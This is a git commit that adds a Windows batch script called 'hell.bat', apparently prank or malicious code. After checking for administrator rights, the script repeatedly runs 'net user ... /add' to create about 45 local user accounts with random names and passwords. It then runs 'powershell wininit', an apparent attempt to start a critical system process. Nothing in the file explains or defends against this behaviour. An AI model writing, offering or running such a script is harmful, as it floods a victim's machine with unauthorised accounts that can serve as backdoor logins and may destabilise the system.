bbe3e3b111dc423448e9d25cba0a97dbc4ba427e
KeparYTbcc <67996155+KeparYTbcc@users.noreply.github.com>
2020-10-25 23:45:15 +0000

    Create hell.bat

---
+++ hell.bat
@@ -0,0 +1,58 @@
+:check_Permissions
+  echo Administrative permissions required. Detecting permissions...
+
+  net session >nul 2>&1
+  if %errorLevel% == 0 (
+    goto start
+  ) else (
+    echo Please start the program as Administrative
+  )
+  pause >nul
+
+:start
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+net user %random%HELL%random% %random% /add
+powershell wininit
